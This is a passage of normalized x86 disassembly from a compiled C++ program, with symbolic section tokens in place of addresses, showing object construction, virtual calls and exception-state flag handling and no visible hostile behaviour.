cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ esp + 0x1c8 ]
call sub_40415f
test [ esp + 0x10 ] 0x2000000
je r-xdata
and [ esp + 0x10 ] 0xfbffffff
push ebx
push 0x1
lea ecx [ esp + 0x3a4 ]
call sub_40415f
test [ esp + 0x10 ] 0x4000000
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x400
je r-xdata
and [ esp + 0x10 ] 0xfffff7ff
push ebx
push 0x1
lea ecx [ esp + 0x2a8 ]
call sub_40415f
test [ esp + 0x10 ] 0x800
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x10
je r-xdata
push r--data
lea ecx [ esp + 0x1fc ]
call sub_403dc1
mov eax [ esp + 0x20 ]
add eax 0xbc
push eax
lea eax [ esp + 0x1fc ]
mov [ esp + 0x864 ] 0x11
or [ esp + 0x14 ] 0x10
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x1000000
je r-xdata
and [ esp + 0x10 ] 0xfdffffff
push ebx
push 0x1
lea ecx [ esp + 0x3dc ]
call sub_40415f
push r--data
lea ecx [ esp + 0x2dc ]
call sub_403dc1
mov [ esp + 0x860 ] 0x21
mov eax [ esi ]
add eax 0x10
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x74 ]
push eax
lea eax [ esp + 0x2dc ]
push eax
mov eax [ esp + 0x1c ]
mov ecx esi
call [ eax ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x2e0 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x774 ]
call sub_403dc1
mov eax [ esp + 0x20 ]
mov [ esp + 0x860 ] 0x22
mov eax [ eax + 0x4 ]
call sub_4049ca
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x774 ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x778 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x314 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x23
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x314 ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x318 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x34c ]
call sub_403dc1
push r--data
lea ecx [ esp + 0x5b4 ]
mov [ esp + 0x864 ] 0x24
call sub_403dc1
lea ecx [ esp + 0x348 ]
push ecx
lea ecx [ esp + 0x5b4 ]
mov [ esp + 0x864 ] 0x25
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x5b8 ]
call sub_40415f
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x350 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x26
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xfffffbff
push ebx
push 0x1
lea ecx [ esp + 0x580 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x13
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xffffffef
push ebx
push 0x1
lea ecx [ esp + 0x200 ]
call sub_40415f
cmp [ esp + 0x1b ] bl
je r-xdata
and [ esp + 0x10 ] 0xfeffffff
push ebx
push 0x1
lea ecx [ esp + 0x414 ]
call sub_40415f
mov [ esp + 0x24 ] ebx
mov esi ebx
push r--data
lea ecx [ esp + 0x384 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x27
or [ esp + 0x10 ] 0x1000
push r--data
lea ecx [ esp + 0x5ec ]
call sub_403dc1
lea eax [ esp + 0x380 ]
push eax
lea eax [ esp + 0x5ec ]
mov [ esp + 0x864 ] 0x28
or [ esp + 0x14 ] 0x2000
push eax
push [ esp + 0x1c ]
xor bl bl
mov edi esi
call sub_41ed6b
mov edi [ esp + 0x1c ]
mov esi eax
mov [ esp + 0x24 ] esi
xor ebx ebx
jmp r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x20
je r-xdata
push r--data
lea ecx [ esp + 0x7ac ]
call sub_403dc1
mov eax [ esp + 0x20 ]
add eax 0xd8
push eax
lea eax [ esp + 0x7ac ]
mov [ esp + 0x864 ] 0x14
or [ esp + 0x14 ] 0x20
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
xor ebx ebx
mov al 0x1
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x58
cmp eax ebx
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x1000
je r-xdata
and [ esp + 0x10 ] 0xffffdfff
push ebx
push 0x1
lea ecx [ esp + 0x5f0 ]
call sub_40415f
test [ esp + 0x10 ] 0x2000
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x16
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xffffffdf
push ebx
push 0x1
lea ecx [ esp + 0x7b0 ]
call sub_40415f
mov [ esp + 0x14 ] ebx
mov esi ebx
push r--data
lea ecx [ esp + 0x480 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x59
or [ esp + 0x10 ] 0x8000000
push r--data
lea ecx [ esp + 0x448 ]
call sub_403dc1
push ebx
lea eax [ esp + 0x480 ]
push eax
lea eax [ esp + 0x44c ]
mov [ esp + 0x868 ] 0x5a
or [ esp + 0x18 ] 0x10000000
push eax
push [ esp + 0x20 ]
call sub_41ec78
mov esi eax
mov [ esp + 0x14 ] esi
jmp r-xdata
push r--data
lea ecx [ esp + 0xac ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0xac ]
mov [ esp + 0x864 ] 0x2b
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0xb0 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x3bc ]
call sub_403dc1
lea ecx [ esp + 0x3b8 ]
mov [ esp + 0x860 ] 0x2c
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4c ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x3c0 ]
mov [ esp + 0x1c ] eax
call sub_40415f
mov edi r--data
push edi
lea ecx [ esp + 0x608 ]
call sub_403dc1
lea edx [ esp + 0x604 ]
mov [ esp + 0x860 ] 0x2d
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
push edx
lea edx [ esp + 0x81c ]
push edx
call [ eax + 0x40 ]
push ebx
push 0x1
lea ecx [ esp + 0x60c ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
cmp [ esp + 0x82c ] ebx
je r-xdata
and [ esp + 0x10 ] 0xffffefff
push ebx
push 0x1
lea ecx [ esp + 0x388 ]
call sub_40415f
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x40
je r-xdata
push r--data
lea ecx [ esp + 0x234 ]
call sub_403dc1
mov eax [ esp + 0x20 ]
add eax 0xf4
push eax
lea eax [ esp + 0x234 ]
mov [ esp + 0x864 ] 0x17
or [ esp + 0x14 ] 0x40
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
xor ebx ebx
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x8000000
je r-xdata
and [ esp + 0x10 ] 0xefffffff
push ebx
push 0x1
lea ecx [ esp + 0x44c ]
call sub_40415f
test [ esp + 0x10 ] 0x10000000
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x47
cmp eax ebx
je r-xdata
push edi
lea ecx [ esp + 0x3f4 ]
call sub_403dc1
lea ecx [ esp + 0x818 ]
push ecx
lea ecx [ esp + 0x3f4 ]
mov [ esp + 0x864 ] 0x30
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x3f8 ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x31
mov edi 0x8000
cmp eax ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
push esi
call [ eax + 0x14 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x238 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x4b8 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x5d
mov eax [ esi ]
add eax 0x10
mov [ esp + 0x30 ] eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x74 ]
push eax
lea eax [ esp + 0x4b8 ]
push eax
mov eax [ esp + 0x38 ]
mov ecx esi
call [ eax ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x4bc ]
call sub_40415f
push r--data
lea ecx [ esp + 0x4f0 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x5e
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x4f0 ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x4f4 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x528 ]
call sub_403dc1
mov eax [ esp + 0x20 ]
mov [ esp + 0x860 ] 0x5f
mov eax [ eax + 0x4 ]
call sub_4049ca
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x528 ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x52c ]
call sub_40415f
push r--data
lea ecx [ esp + 0x598 ]
call sub_403dc1
push r--data
lea ecx [ esp + 0x560 ]
mov [ esp + 0x864 ] 0x60
call sub_403dc1
lea ecx [ esp + 0x594 ]
push ecx
lea ecx [ esp + 0x560 ]
mov [ esp + 0x864 ] 0x61
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x564 ]
call sub_40415f
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x59c ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x860 ] 0x62
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xf7ffffff
push ebx
push 0x1
lea ecx [ esp + 0x484 ]
call sub_40415f
xor edi edi
push r--data
lea ecx [ esp + 0x218 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x48
or [ esp + 0x10 ] 0x100000
push r--data
lea ecx [ esp + 0x1e0 ]
call sub_403dc1
lea eax [ esp + 0x214 ]
push eax
lea eax [ esp + 0x1e0 ]
mov [ esp + 0x864 ] 0x49
or [ esp + 0x14 ] 0x200000
push eax
push [ esp + 0x1c ]
xor bl bl
mov edi esi
call sub_41ed6b
mov edi eax
xor ebx ebx
jmp r-xdata
test [ esp + 0x10 ] edi
je r-xdata
push r--data
lea ecx [ esp + 0x42c ]
call sub_403dc1
mov [ esp + 0x860 ] 0x32
or [ esp + 0x10 ] 0x4000
push r--data
lea ecx [ esp + 0x624 ]
call sub_403dc1
push rw-data
lea eax [ esp + 0x42c ]
push eax
lea eax [ esp + 0x628 ]
mov [ esp + 0x868 ] 0x33
or [ esp + 0x18 ] edi
push eax
push [ esp + 0x20 ]
mov ebx esi
call sub_41ee71
xor ebx ebx
mov [ esp + 0x30 ] ebx
mov esi ebx
push r--data
lea ecx [ esp + 0x640 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x63
or [ esp + 0x10 ] 0x20000000
push r--data
lea ecx [ esp + 0x5d0 ]
call sub_403dc1
lea eax [ esp + 0x63c ]
push eax
lea eax [ esp + 0x5d0 ]
mov [ esp + 0x864 ] 0x64
or [ esp + 0x14 ] 0x40000000
push eax
push [ esp + 0x38 ]
xor bl bl
mov edi esi
call sub_41ed6b
mov edi [ esp + 0x1c ]
mov esi eax
mov [ esp + 0x30 ] esi
xor ebx ebx
jmp r-xdata
mov [ esp + 0x860 ] 0x2f
test [ esp + 0x10 ] 0x100000
je r-xdata
and [ esp + 0x10 ] 0xffdfffff
push ebx
push 0x1
lea ecx [ esp + 0x1e4 ]
call sub_40415f
mov esi [ esp + 0x20 ]
test [ esp + 0x10 ] 0x200000
je r-xdata
mov [ esp + 0x860 ] 0x2f
test [ esp + 0x10 ] 0x4000
je r-xdata
and [ esp + 0x10 ] 0xffff7fff
push ebx
push 0x1
lea ecx [ esp + 0x628 ]
call sub_40415f
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x20000000
je r-xdata
and [ esp + 0x10 ] 0xbfffffff
push ebx
push 0x1
lea ecx [ esp + 0x5d4 ]
call sub_40415f
test [ esp + 0x10 ] 0x40000000
je r-xdata
push r--data
lea ecx [ esp + 0x250 ]
call sub_403dc1
lea ecx [ esi + 0x110 ]
push ecx
lea ecx [ esp + 0x250 ]
mov [ esp + 0x864 ] 0x4c
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x254 ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
push r--data
lea ecx [ esp + 0x288 ]
call sub_403dc1
lea ecx [ esi + 0x12c ]
push ecx
lea ecx [ esp + 0x288 ]
mov [ esp + 0x864 ] 0x4d
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x28c ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
push r--data
lea ecx [ esp + 0x2c0 ]
call sub_403dc1
lea ecx [ esi + 0xbc ]
push ecx
lea ecx [ esp + 0x2c0 ]
mov [ esp + 0x864 ] 0x4e
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x2c4 ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
mov eax [ esi + 0x94 ]
mov eax [ eax ]
mov esi [ esi + 0x80 ]
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] eax
and [ esp + 0x10 ] 0xffefffff
push ebx
push 0x1
lea ecx [ esp + 0x21c ]
call sub_40415f
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x818 ]
push eax
lea eax [ esp + 0x9c ]
push eax
add esi 0x24
push esi
call sub_412dde
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ esp + 0x50 ] eax
mov eax [ esi + 0x18 ]
mov [ esp + 0x38 ] eax
mov eax [ esi ]
lea edi [ esp + 0x34 ]
lea esi [ esp + 0x4c ]
mov [ esp + 0x4c ] ecx
mov [ esp + 0x34 ] eax
call sub_40f543
test al al
jne r-xdata
and [ esp + 0x10 ] 0xffffbfff
push ebx
push 0x1
lea ecx [ esp + 0x430 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x678 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x678 ]
mov [ esp + 0x864 ] 0x67
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x67c ]
call sub_40415f
push r--data
lea ecx [ esp + 0x6b0 ]
call sub_403dc1
lea ecx [ esp + 0x6ac ]
mov [ esp + 0x860 ] 0x68
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4c ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x6b4 ]
mov [ esp + 0x24 ] eax
call sub_40415f
mov edi r--data
push edi
lea ecx [ esp + 0x6e8 ]
call sub_403dc1
lea edx [ esp + 0x6e4 ]
mov [ esp + 0x860 ] 0x69
mov ecx [ esp + 0x1c ]
mov eax [ ecx ]
push edx
lea edx [ esp + 0x838 ]
push edx
call [ eax + 0x40 ]
push ebx
push 0x1
lea ecx [ esp + 0x6ec ]
mov [ esp + 0x868 ] 0x6b
call sub_40415f
push edi
lea ecx [ esp + 0x720 ]
call sub_403dc1
lea ecx [ esp + 0x834 ]
push ecx
lea ecx [ esp + 0x720 ]
mov [ esp + 0x864 ] 0x6c
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x724 ]
mov [ esp + 0x868 ] 0x6b
call sub_40415f
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x834 ]
push eax
lea eax [ esp + 0xa4 ]
add esi 0x24
push eax
push esi
call sub_412dde
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x18 ]
mov [ esp + 0x48 ] eax
mov eax [ esi ]
lea edi [ esp + 0x44 ]
lea esi [ esp + 0x34 ]
mov [ esp + 0x44 ] eax
call sub_40f543
test al al
jne r-xdata
and [ esp + 0x10 ] 0xdfffffff
push ebx
push 0x1
lea ecx [ esp + 0x644 ]
call sub_40415f
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x4 ]
push [ esp + 0x30 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
lea ecx [ esp + 0x818 ]
jmp r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x4f
cmp eax ebx
je r-xdata
push ebx
lea ecx [ esp + 0x838 ]
mov [ esp + 0x850 ] 0xf
call sub_404490
mov [ esp + 0x860 ] 0x36
call sub_40f2d4
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add eax 0x1c
mov eax [ eax ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x4 ]
push [ esp + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
lea ecx [ esp + 0x834 ]
call sub_40f2d4
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add eax 0x1c
mov eax [ eax ]
mov [ esp + 0x40 ] ecx
mov [ esp + 0x3c ] eax
push ebx
push 0x1
call sub_40415f
mov [ esp + 0x1c ] ebx
push r--data
lea ecx [ esp + 0x330 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x50
or [ esp + 0x10 ] __dos_header
push r--data
lea ecx [ esp + 0x2f8 ]
call sub_403dc1
lea eax [ esp + 0x32c ]
push eax
lea eax [ esp + 0x2f8 ]
mov [ esp + 0x864 ] 0x51
mov edi [ esp + 0x28 ]
or [ esp + 0x14 ] 0x800000
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
mov [ esp + 0x1c ] eax
xor ebx ebx
jmp r-xdata
call sub_423d5c
cmp [ esp + 0x28 ] eax
je r-xdata
call sub_423d5c
cmp [ esp + 0x3c ] eax
je r-xdata
mov [ esp + 0x860 ] 0x2f
test [ esp + 0x10 ] __dos_header
je r-xdata
and [ esp + 0x10 ] 0xff7fffff
push ebx
push 0x1
lea ecx [ esp + 0x2fc ]
call sub_40415f
test [ esp + 0x10 ] 0x800000
je r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x83c ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
lea esi [ esp + 0x28 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x834 ]
push edx
lea edx [ esp + 0x81c ]
push edx
lea edx [ esp + 0x80 ]
push edx
call [ eax + 0x8 ]
mov [ esp + 0x860 ] 0x37
mov eax [ esp + 0x90 ]
mov eax [ eax ]
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x78 ]
mov [ esp + 0x3c ] eax
cmp [ esp + 0x2c ] esi
je r-xdata
lea esi [ esp + 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x834 ]
push edx
lea edx [ esp + 0x81c ]
push edx
call [ eax + 0xc ]
mov [ esp + 0x860 ] 0x6d
mov eax [ esp + 0x82c ]
mov eax [ eax ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x818 ]
mov [ esp + 0x28 ] eax
cmp [ esp + 0x40 ] esi
je r-xdata
push r--data
lea ecx [ esp + 0x368 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x54
mov eax [ esp + 0x1c ]
mov edi [ eax ]
lea esi [ esp + 0x34 ]
add edi 0x10
call sub_40f2a9
mov ecx [ esp + 0x1c ]
push eax
lea eax [ esp + 0x368 ]
push eax
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0x36c ]
mov [ esp + 0x868 ] 0x2f
call sub_40415f
call sub_408d54
jmp r-xdata
and [ esp + 0x10 ] 0xffbfffff
push ebx
push 0x1
lea ecx [ esp + 0x334 ]
call sub_40415f
lea esi [ esp + 0x28 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x818 ]
push edx
lea edx [ esp + 0x60 ]
push edx
call [ eax + 0x4 ]
mov [ esp + 0x860 ] 0x40
mov eax [ esp + 0x70 ]
mov eax [ eax ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x5c ]
mov [ esp + 0x34 ] eax
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x38
cmp eax ebx
je r-xdata
call sub_423d5c
cmp eax [ esp + 0x818 ]
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x94 ]
mov eax [ eax + 0x80 ]
lea edi [ esp + 0x44 ]
lea esi [ esp + 0x34 ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x44 ] eax
call sub_41ea56
test al al
je r-xdata
lea eax [ esp + 0x5c ]
call sub_403f2c
lea eax [ esp + 0x78 ]
push eax
mov [ esp + 0x864 ] 0x36
call sub_404bcd
lea esi [ esp + 0x28 ]
call sub_408d54
jmp r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x41
cmp eax ebx
je r-xdata
mov [ esp + 0x1c ] ebx
push r--data
lea ecx [ esp + 0x464 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x39
or [ esp + 0x10 ] 0x10000
push r--data
lea ecx [ esp + 0x7e4 ]
call sub_403dc1
lea eax [ esp + 0x460 ]
push eax
lea eax [ esp + 0x7e4 ]
mov [ esp + 0x864 ] 0x3a
mov edi [ esp + 0x28 ]
or [ esp + 0x14 ] 0x20000
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
mov [ esp + 0x1c ] eax
xor ebx ebx
jmp r-xdata
lea edi [ esp + 0x818 ]
mov [ esp + 0x860 ] 0x6b
call sub_405102
push [ esp + 0x818 ]
call sub_42412e
pop ecx
lea esi [ esp + 0x3c ]
call sub_408d54
jmp r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x860 ] 0x6e
cmp eax ebx
je r-xdata
cmp [ esp + 0x2c ] esi
je r-xdata
lea esi [ esp + 0x4c ]
call sub_40f2d4
mov esi [ eax + 0x30 ]
add eax 0x1c
mov eax [ eax ]
cmp [ esp + 0x28 ] ebx
je r-xdata
mov [ esp + 0x1c ] ebx
push r--data
lea ecx [ esp + 0x170 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x42
or [ esp + 0x10 ] 0x40000
push r--data
lea ecx [ esp + 0x138 ]
call sub_403dc1
lea eax [ esp + 0x16c ]
push eax
lea eax [ esp + 0x138 ]
mov [ esp + 0x864 ] 0x43
mov edi [ esp + 0x28 ]
or [ esp + 0x14 ] 0x80000
push eax
push [ esp + 0x1c ]
xor bl bl
call sub_41ed6b
mov [ esp + 0x1c ] eax
xor ebx ebx
jmp r-xdata
mov [ esp + 0x860 ] 0x37
test [ esp + 0x10 ] 0x10000
je r-xdata
and [ esp + 0x10 ] 0xfffdffff
push ebx
push 0x1
lea ecx [ esp + 0x7e8 ]
call sub_40415f
test [ esp + 0x10 ] 0x20000
je r-xdata
lea esi [ esp + 0x34 ]
call sub_40f2d4
mov esi [ eax + 0x30 ]
add eax 0x1c
mov eax [ eax ]
cmp [ esp + 0x3c ] ebx
je r-xdata
mov [ esp + 0x1c ] ebx
push r--data
lea ecx [ esp + 0x790 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x6f
or [ esp + 0x10 ] 0x80000000
push r--data
lea ecx [ esp + 0x758 ]
call sub_403dc1
lea eax [ esp + 0x78c ]
push eax
lea eax [ esp + 0x758 ]
mov [ esp + 0x864 ] 0x70
mov edi [ esp + 0x34 ]
or [ esp + 0x28 ] 0x1
push eax
push [ esp + 0x24 ]
xor bl bl
call sub_41ed6b
mov [ esp + 0x1c ] eax
xor ebx ebx
jmp r-xdata
mov [ esp + 0x860 ] 0x40
test [ esp + 0x10 ] 0x40000
je r-xdata
and [ esp + 0x10 ] 0xfff7ffff
push ebx
push 0x1
lea ecx [ esp + 0x13c ]
call sub_40415f
test [ esp + 0x10 ] 0x80000
je r-xdata
push r--data
lea ecx [ esp + 0x65c ]
call sub_403dc1
mov [ esp + 0x860 ] 0x3d
mov eax [ esp + 0x1c ]
mov edi [ eax ]
lea esi [ esp + 0x3c ]
add edi 0x10
call sub_40f2d4
mov esi [ esp + 0x1c ]
push eax
lea eax [ esp + 0x65c ]
push eax
mov ecx esi
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0x660 ]
mov [ esp + 0x868 ] 0x37
call sub_40415f
push r--data
lea ecx [ esp + 0xc8 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x3e
mov edi [ esi ]
lea esi [ esp + 0x3c ]
add edi 0x10
call sub_40f2d4
mov esi [ esp + 0x1c ]
add eax 0x1c
push eax
lea eax [ esp + 0xc8 ]
push eax
mov ecx esi
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0xcc ]
mov [ esp + 0x868 ] 0x37
call sub_40415f
push r--data
lea ecx [ esp + 0x100 ]
call sub_403dc1
lea ecx [ esp + 0x834 ]
push ecx
lea ecx [ esp + 0x100 ]
mov [ esp + 0x864 ] 0x3f
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x104 ]
mov [ esp + 0x868 ] 0x37
call sub_40415f
lea esi [ esp + 0x3c ]
call sub_41325d
jmp r-xdata
and [ esp + 0x10 ] 0xfffeffff
push ebx
push 0x1
lea ecx [ esp + 0x468 ]
call sub_40415f
mov [ esp + 0x860 ] 0x6d
test [ esp + 0x10 ] 0x80000000
je r-xdata
and [ esp + 0x24 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ esp + 0x75c ]
call sub_40415f
test [ esp + 0x24 ] 0x1
je r-xdata
push r--data
lea ecx [ esp + 0x1a8 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x46
mov eax [ esp + 0x1c ]
mov edi [ eax ]
lea esi [ esp + 0x34 ]
add edi 0x10
call sub_40f2a9
mov ecx [ esp + 0x1c ]
push eax
lea eax [ esp + 0x1a8 ]
push eax
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x868 ] 0x40
call sub_40415f
call sub_408d54
jmp r-xdata
and [ esp + 0x10 ] 0xfffbffff
push ebx
push 0x1
lea ecx [ esp + 0x174 ]
call sub_40415f
mov eax [ esp + 0x90 ]
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x78 ]
lea edi [ esp + 0x54 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x54 ] eax
call sub_40f543
test al al
jne r-xdata
lea esi [ esp + 0x28 ]
call sub_40f2a9
add eax 0x1c
cmp [ eax + 0x14 ] ebx
jne r-xdata
and [ esp + 0x10 ] 0x7fffffff
push ebx
push 0x1
lea ecx [ esp + 0x794 ]
call sub_40415f
mov eax [ esp + 0x70 ]
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x5c ]
lea edi [ esp + 0x44 ]
lea esi [ esp + 0x34 ]
mov [ esp + 0x44 ] eax
call sub_41ea56
test al al
je r-xdata
lea esi [ esp + 0x28 ]
call sub_40f2a9
mov edi eax
add edi 0x1c
mov eax [ esp + 0x20 ]
mov eax [ eax + 0x4 ]
call sub_4049ca
mov edi eax
add edi 0x8c
jmp r-xdata
mov eax [ esp + 0x28 ]
mov esi [ esp + 0x82c ]
cmp eax ebx
je r-xdata
push r--data
lea ecx [ esp + 0x7c8 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x73
mov esi [ esp + 0x1c ]
mov eax [ esi ]
push edi
lea ecx [ esp + 0x7c8 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x7cc ]
mov [ esp + 0x868 ] 0x6d
call sub_40415f
push r--data
lea ecx [ esp + 0x800 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x74
mov edi [ esi ]
lea esi [ esp + 0x28 ]
add edi 0x10
call sub_40f2a9
mov esi [ esp + 0x1c ]
push eax
lea eax [ esp + 0x800 ]
push eax
mov ecx esi
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0x804 ]
mov [ esp + 0x868 ] 0x6d
